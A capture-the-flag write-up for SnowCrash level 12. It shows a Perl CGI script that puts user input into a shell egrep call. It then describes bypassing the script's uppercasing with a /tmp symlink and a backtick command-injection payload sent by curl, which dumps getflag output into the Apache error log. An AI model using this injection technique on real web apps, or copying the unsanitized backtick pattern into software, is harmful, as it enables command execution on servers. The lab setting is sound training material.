When we started the level we found a level12.pl.
=> 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));

We can easily understand that the security breach is `@output = `egrep "^$xx" /tmp/xd 2>&1`;`

We tried to made some injections but the regex turn our ls to => LS that make some errors .. 
After one full day of research we tried to exec /bin/ls and to trasnfer the result in the error file of apache in /var/log/apache2/error.log and we finaly get some error to try to debug things : [Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] /*/LS: not found.

After this we got idea to just make a link beetween /bin/ls and /tmp/LS : ln -s /bin/ls /tmp/LS
Then trying to execute curl '127.0.0.1:4646/?x=`/*/ls%3E%262`'.

This work, we got an LS in the errorlog of Apache

Do this with Getflag and we finaly get the flag ! cat /var/log/apache2/error.log :
[Thu Feb 08 13:41:20 2024] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

/*********************************************************\

flag12@SnowCrash:~$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

\*********************************************************/
